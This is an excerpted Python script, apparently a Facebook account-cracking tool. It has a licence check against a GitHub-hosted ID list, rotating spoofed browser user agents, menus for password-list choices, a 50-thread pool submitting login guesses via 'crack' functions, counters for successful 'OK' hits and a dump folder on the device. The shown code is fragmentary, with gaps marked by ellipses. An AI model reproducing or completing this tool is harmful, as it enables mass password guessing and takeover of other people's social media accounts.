...
def chk():
    ...
    try:
        httpChat = requests.get("https://github.com/SEXC2/e/blob/main/sex.txt").text
        if id in httpChat:
...
try:
        ...
        cetak(nel('\t•WELCOME MY TOOLS FACEBOOK ➺RASKON•'))
        os.system('pip install rich')
try:
        import stdiomask
except ImportError:
        cetak(nel('\t•WELCOME MY TOOLS FACEBOOK ➺ALOOSH•'))
...
for t in range(10000):
	...
	j=random.choice(["XiaoMi/MiuiBrowser/13.23.2-gn","XiaoMi/MiuiBrowser/13.13.2-gn","XiaoMi/MiuiBrowser/13.16.1-gn","XiaoMi/MiuiBrowser/13.25.2.1-gn","XiaoMi/MiuiBrowser/12.15.3-go","XiaoMi/MiuiBrowser/13.29.0-gn","XiaoMi/MiuiBrowser/13.28.0-gn","XiaoMi/MiuiBrowser/12.7.5-go","XiaoMi/MiuiBrowser/13.28.0-gn","XiaoMi/MiuiBrowser/12.22.0.3-gn"])
...
def menu():
	...
	print(' \033[1;33m[1] \033[2;34mᖴIᒪE  ')
	print('')
	print(' \033[1;33m[0] \033[2;34mE᙭IT ')
	print('')
	_____raskon_vip_____ = input('\n \033[1;31m CHOCE -> ')
	print('')
	if _____raskon_vip_____ in ['1']:
		crack_file()
	elif _____raskon_vip_____ in ['0']:
...
def setting():
	...
	banner()
	print('')
	print(' \x1b[38;5;117m[1] Oᒪᗪ Iᗪᘔ ')
	print('')
	print('')
	print(' \x1b[38;5;136m[2] ᑎEᗯ IᗪᘔE ')
	print('')
	print('')
	print(' \x1b[38;5;136m[3] ᑎEᗯ+Oᒪᗪ ')
	print('')
...
def su():
	...
	print(f'''
\x1b[1;97m 🥎[𝟙] 𝐏𝐚𝐬𝐬 𝐖𝐨𝐫𝐥𝐝
\x1b[93m 🏀[𝟚] 𝗣𝗮𝘀𝘀 𝗜𝗿𝗮𝗾
\x1b[30m ⚽[𝟛] ℙ𝕒𝕤𝕤 𝕐𝕖𝕒𝕣'𝕤
                                          ''')
	ch = input('\x1b[38;5;228m╚═➣ Ｃｈｏｏｓｅ ๛   \x1b[1;93m  ')
	if ch in ['1','01']:
		passwrd()
	elif ch in ['2','02']:
		password2()
...
def passwrd():
	clear()
	logo()
	print(f'>>>>> {m}•{k}•{h}•{x} welcom my tool sex {m}•{k}•{h}•{x} <<<<< ')
	print('')
	print(f'>> ALI {h}OK{x} ROR VIP : {h}OK/%s {x}'%(okc))
	...
	with tred(max_workers=50) as pool:
		for yuzong in id2:
			...
			elif 'crack1' in method:
				pool.submit(crack1,idf,pwv)
			elif 'ali' in method:
				pool.submit(cek_opsi,idf,pwv)
			elif 'das' in method:
...
def password2():
	clear()
	logo()
	print(f'>>>>> {m}•{k}•{h}•{x} WELCOM MY TOOL {m}•{k}•{h}•{x} <<<<< ')
	print('')
...
if __name__=='__main__':
	...
	try:os.mkdir('/sdcard/ROR-DUMP')
	except:pass
	try:os.system('sex.prox.txt')
	except:pass
	try:os.system('clear')
	except:pass
	menu()
